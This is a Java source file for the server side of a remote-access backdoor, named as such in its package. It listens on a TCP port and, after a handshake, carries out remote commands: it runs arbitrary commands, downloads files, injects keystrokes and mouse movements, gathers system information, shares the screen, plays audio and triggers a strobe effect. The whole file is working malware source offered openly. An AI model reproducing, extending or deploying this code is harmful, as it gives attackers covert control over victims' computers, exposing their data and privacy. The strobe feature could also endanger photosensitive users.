package net.jaguargaming.backdoor.server;

import java.awt.AWTException;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;

import org.hyperic.sigar.SigarException;

import net.jaguargaming.backdoor.commandhandlers.CMDdialog;
import net.jaguargaming.backdoor.commandhandlers.CMDdownload;
import net.jaguargaming.backdoor.commandhandlers.CMDexec;
import net.jaguargaming.backdoor.commandhandlers.CMDmousepos;
import net.jaguargaming.backdoor.commandhandlers.CMDmusic;
import net.jaguargaming.backdoor.commandhandlers.CMDscreenshare;
import net.jaguargaming.backdoor.commandhandlers.CMDstrobe;
import net.jaguargaming.backdoor.commandhandlers.CMDsysinfo;
import net.jaguargaming.backdoor.commandhandlers.CMDtypekey;
import net.jaguargaming.backdoor.utils.Stroboskop;

public class Server {
	
	public static final int PORT = 6768;
	
	public static void main(String[] args) {
		try {
			while (true) {
				ServerSocket ss = new ServerSocket(PORT);
				Socket s = ss.accept();
				DataInputStream din = new DataInputStream(s.getInputStream());
				DataOutputStream dout = new DataOutputStream(s.getOutputStream());
				Stroboskop stroboskop;
				ScreenshareServer ssserver;
				String message = din.readUTF();
				if (message.equalsIgnoreCase("hello")) {
					dout.writeUTF("hello");
					dout.flush();
					stroboskop = new Stroboskop(2);
					System.out.println("Making a SS-Server...");
					ssserver = new ScreenshareServer(6769);
					System.out.println("SSServer made!");
				} else {
					din.close();
					dout.close();
					s.close();
					ss.close();
					continue;
				}
				while (true) {
					message = din.readUTF();
					System.out.println(message);
					if (message.startsWith("exec")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDexec.handle(cmd_args);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: Command executed successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (IOException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IOException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("dialog")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDdialog.handle(cmd_args);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: Dialog created successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("strobe")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDstrobe.handle(cmd_args, stroboskop);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: Strobe command executed successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("music")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDmusic.handle(cmd_args);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: Music started successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (LineUnavailableException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: LineUnavaibleException: " + e.getMessage());
							dout.flush();
						} catch (UnsupportedAudioFileException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: UnsupportedAudioFileException: " + e.getMessage());
							dout.flush();
						} catch (IOException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IOException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("mousepos")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDmousepos.handle(cmd_args);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: Mouse position changed successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (AWTException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: AWTException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("typekey")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDtypekey.handle(cmd_args);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: Key(s) typed successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (AWTException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: AWTException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("sysinfo")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							String[] sysinfo = CMDsysinfo.handle(cmd_args);
							for (String line : sysinfo) {
								dout.writeUTF(line);
								dout.flush();
							}
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: System info found out successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (SigarException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: SigarException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("download")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDdownload.handle(cmd_args);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: File downloaded successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (IOException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IOException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.startsWith("screenshare")) {
						int index = 1;
						String[] cmd_args = new String[(message.split(" ").length) - 1];
						for (int i = 0; index < message.split(" ").length; i++) {
							cmd_args[i] = message.split(" ")[index];
							index++;
						}
						try {
							CMDscreenshare.handle(cmd_args, ssserver);
							dout.writeUTF("[" + System.getProperty("user.name") + "] SUCCESS: ScreenShare command executed successfully");
							dout.flush();
						} catch (IllegalArgumentException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IllegalArgumentException: " + e.getMessage());
							dout.flush();
						} catch (IOException e) {
							dout.writeUTF("[" + System.getProperty("user.name") + "] ERROR: IOException: " + e.getMessage());
							dout.flush();
						}
					} else if (message.equalsIgnoreCase("bye im out")) {
						dout.writeUTF("see you");
						dout.flush();
						dout.close();
						din.close();
						s.close();
						ss.close();
						break;
					} else {
						dout.writeUTF(("[" + System.getProperty("user.name") + "] ERROR: Command not found"));
						dout.flush();
					}
					dout.writeUTF(("end"));
					dout.flush();
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		} 
	}

}
